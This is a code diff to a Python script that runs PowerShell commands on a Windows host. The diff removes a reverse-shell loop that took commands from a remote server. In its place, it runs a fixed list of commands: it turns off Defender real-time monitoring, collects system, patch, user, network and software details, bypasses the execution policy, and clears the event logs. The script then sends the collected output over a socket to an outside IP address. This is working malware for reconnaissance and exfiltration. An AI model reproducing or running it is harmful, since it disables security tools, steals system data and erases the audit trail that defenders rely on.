@@ -15,32 +15,37 @@ def run_powershell_command(command):
     return result
 
 def main():
-    run_powershell_command("Set-MpPreference -DisableRealtimeMonitoring $true")
+    cmnds_to_run = [
+        '''Set-MpPreference -DisableRealtimeMonitoring $true''',
+        '''systeminfo''',
+        '''systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information''',
+        '''wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches''',
+        '''wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture''',
+        '''[System.Environment]::OSVersion.Version #Current OS version''','''Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches''',
+        '''Get-Hotfix -description "Security update" #List only "Security Update" patches''',
+        '''Get-Process''',
+        '''Get-Service''',
+        '''Get-LocalUser''',
+        '''Get-NetIPAddress''',
+        '''Get-WmiObject -Class Win32_Product''',
+        '''Set-ExecutionPolicy Bypass''',
+        '''Clear-EventLog''',
+        '''exit'''
+    ]
+    output =""
+    for cmnd in cmnds_to_run:
+        output += run_powershell_command(cmnd)
     # Server address and port
     host = '175.45.176.100'
     port = 8080
-    check = "text"
     # Create a socket object
     client_socket = socket(AF_INET, SOCK_STREAM)
     
     # Connect to the server
     client_socket.connect((host, port))
+        
+    client_socket.sendall(output.encode('utf-8'))
 
-    while "exit" not in check:
-        try:
-
-            # Receive the response from the server
-            cmnd = client_socket.recv(1024)
-
-            out = run_powershell_command(cmnd)
-
-            check = str(cmnd)
-            
-            client_socket.sendall(out.encode('utf-8'))
-            
-        except Exception as e:
-            print("An error occurred:", str(e))
-            client_socket.close()
     client_socket.close()
 
 if __name__ == "__main__":
